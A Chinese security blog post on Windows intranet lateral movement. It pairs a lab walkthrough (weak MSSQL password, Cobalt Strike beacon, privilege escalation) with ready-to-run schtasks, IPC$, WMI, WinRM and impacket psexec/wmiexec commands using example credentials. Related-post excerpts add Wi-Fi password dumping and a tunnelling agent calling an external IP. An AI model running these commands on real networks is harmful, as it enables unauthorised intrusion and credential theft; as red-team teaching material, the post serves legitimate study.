@@ -1,0 +1,201 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网横向移动 | Kenny 的网络安全博客</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="7ad0ff"><meta name="description" content="含义在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过横向，攻击者最终获得域控制器的访问权限，甚至完全控制基于 Windows 操作系统的整个内网环境，控制域环境下的全部机器。一般分为四个点：1.漏洞利用 2.服务利用 3.令牌横向 4.软件部署利用 漏洞利用ms17_010 最好不要打蓝屏，直接用 m">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网横向移动">
+<meta property="og:url" content="https://www.52jl.top/2026/02/11/nw2/index.html">
+<meta property="og:site_name" content="Kenny 的网络安全博客">
+<meta property="og:description" content="含义在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过横向，攻击者最终获得域控制器的访问权限，甚至完全控制基于 Windows 操作系统的整个内网环境，控制域环境下的全部机器。一般分为四个点：1.漏洞利用 2.服务利用 3.令牌横向 4.软件部署利用 漏洞利用ms17_010 最好不要打蓝屏，直接用 m">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-09.webp">
+<meta property="article:published_time" content="2026-02-11T07:05:56.849Z">
+<meta property="article:modified_time" content="2026-02-12T08:32:29.295Z">
+<meta property="article:author" content="Kenny">
+<meta property="article:tag" content="Cobalt Strike">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="流量转发">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-09.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "内网横向移动",
+  "url": "https://www.52jl.top/2026/02/11/nw2/",
+  "image": "https://www.52jl.top/img/covers/shinchan-cover-09.webp",
+  "datePublished": "2026-02-11T07:05:56.849Z",
+  "dateModified": "2026-02-12T08:32:29.295Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Kenny",
+      "url": "https://www.52jl.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/11/nw2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网横向移动',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;600;700&family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Patrick+Hand&family=ZCOOL+KuaiLe&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/shinchan-crayon-bg.svg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/covers/shinchan-cover-09.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Kenny 的网络安全博客</span></a><a class="nav-page-title" href="/"><span class="site-name">内网横向移动</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">内网横向移动</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-11T07:05:56.849Z" title="发表于 2026-02-11 15:05:56">2026-02-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-12T08:32:29.295Z" title="更新于 2026-02-12 16:32:29">2026-02-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h1><p>在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过横向，攻击者最终获得域控制器的访问权限，甚至完全控制基于 Windows 操作系统的整个内网环境，控制域环境下的全部机器。<br>一般分为四个点：1.漏洞利用 2.服务利用 3.令牌横向 4.软件部署利用</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>ms17_010 最好不要打蓝屏，直接用 msf 一把梭 auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</p>
+<p>内网典型漏洞利用清单：操作系统服务漏洞：ms08_067、ms17_010、cve2019_0708。操作系统弱口令：SSH、RDP、VNC、telnet。各类数据库漏洞：mysql、mssql、redis。各类中间件框架漏洞：struts2 系列、weblogic 系列、Jboss 系列、Tomcat 系列、Jekins 系列、Apache Solr。各类开源框架漏洞：fastjson、shiro。各类开源系统漏洞：禅道项目管理系统、Jumpserver。各类商业系统漏洞：泛 OA、金 OA、蓝 OA、致 OA。</p>
+<h1 id="服务利用"><a href="#服务利用" class="headerlink" title="服务利用"></a>服务利用</h1><h2 id="一次靶机实战"><a href="#一次靶机实战" class="headerlink" title="一次靶机实战"></a>一次靶机实战</h2><h3 id="开局-fscan"><a href="#开局-fscan" class="headerlink" title="开局 fscan"></a>开局 fscan</h3><p>扫描边界，发现 mssql 弱口令<br><img src="/2026/02/11/nw2/1.webp" loading='lazy'></p>
+<p>SharpSQLTools.exe直接上线cs</p>
+<p><img src="/2026/02/11/nw2/2.webp" loading='lazy'></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>使用插件 SweetPotato进行提权</p>
+<p><img src="/2026/02/11/nw2/3.webp" loading='lazy'></p>
+<h3 id="进行信息收集"><a href="#进行信息收集" class="headerlink" title="进行信息收集"></a>进行信息收集</h3><p>定位域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/11/nw2/4.webp" loading='lazy'></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run ping -n 1 OWA2010SP3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/11/nw2/5.webp" loading='lazy'></p>
+<p>发现域控ip 192.168.31.142 端口扫描</p>
+<p><img src="/2026/02/11/nw2/6.webp" loading='lazy'></p>
+<p>域管查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/11/nw2/7.webp" loading='lazy'></p>
+<p>抓取密码</p>
+<p><img src="/2026/02/11/nw2/9.webp" loading='lazy'></p>
+<h3 id="smb横向"><a href="#smb横向" class="headerlink" title="smb横向"></a>smb横向</h3><p>生成 smb 监听，生成木马，上传到边界机，创建计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">创建任务</span><br><span class="line">shell schtasks /create /s 192.168.3.142 /ru system /u sqladmin /p admin!@#45 /tn transfer /sc DAILY /tr C:\smb.exe /f</span><br><span class="line">运行任务</span><br><span class="line">shell schtasks /run /s 192.168.3.142 /u sqladmin /p admin!@#45 /tn transfer /i</span><br><span class="line">删除任务</span><br><span class="line">schtasks /delete /s 192.168.3.142 /u sqladmin /p admin!@#45 /tn transfer /f</span><br><span class="line"></span><br><span class="line">上线</span><br><span class="line">link 192.168.3.142</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/11/nw2/8.webp" loading='lazy'></p>
+<p>成功横向</p>
+<p><img src="/2026/02/11/nw2/10.webp" loading='lazy'></p>
+<h2 id="ipc横向"><a href="#ipc横向" class="headerlink" title="ipc横向"></a>ipc横向</h2><p>IPC(Internet Process Connection)共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC 可以通过验证用户名和密码获得相应的权限，使用 139&#x2F;445 端口。利用条件：1、目标机开启了 139&#x2F;445 端口 2、目标主机管理员开启了 ipc$ 默认共享 3、知道目标机的账户密码<br>建立连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.3.142\ipc$ &quot;admin!@#45&quot; /user:sqladmin</span><br></pre></td></tr></table></figure>
+
+<p>执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell tasklist /S 192.168.3.142 /U sqladmin /P admin!@#45</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/11/nw2/11.webp" loading='lazy'></p>
+<h2 id="WMI横向"><a href="#WMI横向" class="headerlink" title="WMI横向"></a>WMI横向</h2><p>WMI 全称“Windows 管理规范”，从 win2003 开始一直存在。它原本的作用是方便管理员对 Windows 主机进行管理，因此在内网渗透中，我们可以使用 WMI 服务进行横向移动。其支持用户名明文或 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。<br>利用条件：1、WMI 服务开启，端口 135，默认开启。2、防火墙允许 135&#x2F;445 等端口通信。3、知道目标机的账户密码。<br>自带 WMI 明文传递，无回显。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.3.142 /user:sqladmin /password:admin!@#45 process call c</span><br><span class="line">reate &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/11/nw2/12.webp" loading='lazy'></p>
+<p>Impacket 工具：wmiexec.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-wmiexec 0day/sqladmin:&#x27;admin!@#45&#x27;@192.168.3.142</span><br></pre></td></tr></table></figure>
+
+<h2 id="smb横向-1"><a href="#smb横向-1" class="headerlink" title="smb横向"></a>smb横向</h2><p>SMB 是同一网络或域上的 Windows 机器的文件、打印机和串行端口共享协议。使用 SMB 与文件共享进行交互，可以在整个网络中横向移动。利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件是 445 服务端口开放。利用条件：1、445 端口开启 2、知道账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-smbexec 0day/sqladmin:&#x27;admin!@#45&#x27;@192.168.3.142</span><br></pre></td></tr></table></figure>
+
+<h2 id="DCOM横向"><a href="#DCOM横向" class="headerlink" title="DCOM横向"></a>DCOM横向</h2><p>Windows 组件对象模型（COM）是原生 Windows 应用程序编程接口（API）的一个组件，它允许软件对象或实现一个或多个接口的可执行代码之间进行交互。通过 COM，客户端对象可以调用服务器对象的方法，通常是动态链接库（DLL）或可执行文件（EXE）。分布式 COM（DCOM）是透明的中间件，使用远程过程调用（RPC）技术将 COM 的功能扩展到本地计算机之外。通过利用分布式组件对象模型（DCOM）使用有效帐户与远程机器进行交互。默认情况下，只有管理员才能通过 DCOM 远程激活和启动 COM 对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-dcomexec 0day/sqladmin:&#x27;admin!@#45&#x27;@192.168.3.142</span><br></pre></td></tr></table></figure>
+
+<h2 id="WinRM横向"><a href="#WinRM横向" class="headerlink" title="WinRM横向"></a>WinRM横向</h2><p>WinRM（微软远程管理）是 WS-Management 协议的实现组件。WinRM 是 Windows 操作系统的一部分，是一项允许管理员在系统上远程执行管理任务的服务，使用此服务需要管理员级别的凭据。通信通过 HTTP（5985）或 HTTPS（5986）执行，5986 关闭表示 WinRM 服务配置为仅接受 HTTP 连接。默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证。Windows Vista&#x2F;Win7 必须手动启动，Windows 2008 以上版本默认自动状态；WinRS 适用于 Windows 2008 以上版本，Windows 2012 之后的版本默认允许远程任意主机来管理。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run winrs -r:OWA2013 -u:dbadmin -p:admin!@#45 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/11/nw2/13.webp" loading='lazy'></p>
+<h2 id="PSEXEC横向"><a href="#PSEXEC横向" class="headerlink" title="PSEXEC横向"></a>PSEXEC横向</h2><p>PsExec 主要用于大批 Windows 主机的维护，在域环境下效果尤其好（因为 PsExec 是 Windows 提供的工具，所以杀毒软件将其列入白名单中）。因为使用 PsExec 通过命令行环境与目标机器建立连接，甚至控制目标机器，而不需要通过远程桌面（RDP）进行图形化的控制。PsExec 包含在 PsTools 工具包中，下载地址：<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a>。通过 PsExec 可以在远程目标主机上执行命令，也可以将管理员权限提升为 System 权限以运行指定的程序。PsExec 的基本原理是：通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 “PSEXESVC” 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-psexec 0day/sqladmin:&#x27;admin!@#45&#x27;@192.168.3.142</span><br></pre></td></tr></table></figure>
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.52jl.top">Kenny</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.52jl.top/2026/02/11/nw2/">https://www.52jl.top/2026/02/11/nw2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://www.52jl.top" target="_blank">Kenny 的网络安全博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Cobalt-Strike/">Cobalt Strike</a><a class="post-meta__tags" href="/tags/%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">流量转发</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/12/exchange/" title="exchange后渗透"><img class="cover" src="/img/covers/shinchan-cover-10.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">exchange后渗透</div></div><div class="info-2"><div class="info-item-1">域内定位exchangespn定位exchange1setspn -T 0day.org -q */*  管道符搜索exchange  定位ip  ldap定位https://learn.microsoft.com/zh-cn/sysinternals/downloads/adexplorer搜索 导出通讯录https://github.com/dafthack/MailSniper 1234powershell -exec bypassImport-Module .\MailSniper.ps1Get-GlobalAddressList -ExchHostname 192.168.3.144 -UserName rootkit\jerry -Password Admin12345 -OutFile global-address-list.txt   检查每个邮箱地址是否有公开⽬录1Invoke-OpenInboxFinder -EmailList .\mail.txt -ExchHostname 192.168.3.144 -remote 寻找⾼权限的收件箱1Invoke-Op...</div></div></div></a><a class="pagination-related" href="/2026/02/09/sd/" title="内网隧道搭建"><img class="cover" src="/img/covers/shinchan-cover-08.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">内网隧道搭建</div></div><div class="info-2"><div class="info-item-1">反向代理工具 1https://github.com/ph4ntonn/Stowaway  使用方法 12chmod +x linux_x64_admin ./linux_x64_admin -l 5652 -s 243142//5652端口 243142密钥   通过 webshell 上传 agent.exe 到目标主机并运行 12345678winagent.exe -c 1.95.47.217:5651 -s 243142 --reconnect 10 # 后台运行start /B agent.exe -c 1.95.47.217:5651 -s 243142 --reconnect 10 &gt; NUL 2&gt;&amp;1linux./linux_x86_agent -c 1.95.47.217:5651 -s 243142 --reconnect 10  在服务端上选择节点，设置 socks5 代理  打开 Proxifier.exe, 添加代理服务器 123192.168.*.*172.*.*.*10.*.*.*   代理给谷歌浏览器  连接数据库 使用 bp...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/06/cs1/" title="cs部署修改&amp;cs中间件转发&amp;RedGuard重定向"><img class="cover" src="/img/covers/shinchan-cover-01.webp" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-06</div><div class="info-item-2">cs部署修改&amp;cs中间件转发&amp;RedGuard重定向</div></div><div class="info-2"><div class="info-item-1">cs部署修改修改端口1.搭建cobaltstrike服务器，抹除默认特征端口默认cs的端口是50050，可以在teamserver中进行修改 修改证书cs默认证书是带有很多特征的，用以下命令来查看，默认密码是123456，在上面的teamserver文件里面也能看到面 1keytool -list -v -keystore cobaltstrike.store  可以看到这里的别名，所有者，颁发者都是带有cobaltstrike的特征，这些都是需要进行修改的，这里直接用keytool进行自证书颁发 123keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname &quot;CN=US, OU=360.com, O=Sofaware, L=Somewhere,ST=Cyberspace, C=CN  接着再看一下生成的证书信息  成功修改成我们想要修改的内容 流量隐藏(编写c2profile)抓包对比分析cobalt...</div></div></div></a><a class="pagination-related" href="/2026/02/12/exchange/" title="exchange后渗透"><img class="cover" src="/img/covers/shinchan-cover-10.webp" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-12</div><div class="info-item-2">exchange后渗透</div></div><div class="info-2"><div class="info-item-1">域内定位exchangespn定位exchange1setspn -T 0day.org -q */*  管道符搜索exchange  定位ip  ldap定位https://learn.microsoft.com/zh-cn/sysinternals/downloads/adexplorer搜索 导出通讯录https://github.com/dafthack/MailSniper 1234powershell -exec bypassImport-Module .\MailSniper.ps1Get-GlobalAddressList -ExchHostname 192.168.3.144 -UserName rootkit\jerry -Password Admin12345 -OutFile global-address-list.txt   检查每个邮箱地址是否有公开⽬录1Invoke-OpenInboxFinder -EmailList .\mail.txt -ExchHostname 192.168.3.144 -remote 寻找⾼权限的收件箱1Invoke-Op...</div></div></div></a><a class="pagination-related" href="/2026/02/08/nw/" title="内网凭证窃取"><img class="cover" src="/img/covers/shinchan-cover-06.webp" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-08</div><div class="info-item-2">内网凭证窃取</div></div><div class="info-2"><div class="info-item-1">内网凭证搜集主机密码 hashdump    logonpasswords   这里可以看见之前获取过的凭证信息  浏览器密码https://github.com/moonD4rk/HackBrowserData 或者使用 cs 插件 wifi密码123456# 列出所有连接过的WiFi的配置文件（全部直接cmd运行）netsh wlan show profiles# 查看到某个具体WiFi的配置详情，包括密码：netsh wlan show profiles name=&quot;XSZXJY_5G&quot; key=clear # 一条命令查看所有for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear &gt; wifipass.txt  文档密码123451 dir /a /s /b c:*.xls2 d...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="author-info-name">Kenny</div><div class="author-info-description">一个记录网络安全的博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://qm.qq.com/q/QNgesnj1aU"><i class="fab fa-qq"></i><span>Kenny's Blog 群</span></a><a id="card-info-tool-btn" href="/tools/url-extractor/"><i class="fas fa-link"></i><span>IP域名提取工具</span></a><a id="card-info-pass-btn" href="/tools/password-dict/"><i class="fas fa-key"></i><span>密码字典生成</span></a><a id="card-info-av-btn" href="/tools/av-detector/"><i class="fas fa-shield-virus"></i><span>杀软识别</span></a><a id="card-info-shell-btn" href="/tools/shell-command/"><i class="fas fa-terminal"></i><span>Java命令编码</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">一个记录网络安全的博客 欢迎加群前来交流</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%AB%E4%B9%89"><span class="toc-number">1.</span> <span class="toc-text">含义</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">服务利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98"><span class="toc-number">3.1.</span> <span class="toc-text">一次靶机实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%B1%80-fscan"><span class="toc-number">3.1.1.</span> <span class="toc-text">开局 fscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.1.3.</span> <span class="toc-text">进行信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E6%A8%AA%E5%90%91"><span class="toc-number">3.1.4.</span> <span class="toc-text">smb横向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ipc%E6%A8%AA%E5%90%91"><span class="toc-number">3.2.</span> <span class="toc-text">ipc横向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI%E6%A8%AA%E5%90%91"><span class="toc-number">3.3.</span> <span class="toc-text">WMI横向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smb%E6%A8%AA%E5%90%91-1"><span class="toc-number">3.4.</span> <span class="toc-text">smb横向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCOM%E6%A8%AA%E5%90%91"><span class="toc-number">3.5.</span> <span class="toc-text">DCOM横向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinRM%E6%A8%AA%E5%90%91"><span class="toc-number">3.6.</span> <span class="toc-text">WinRM横向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 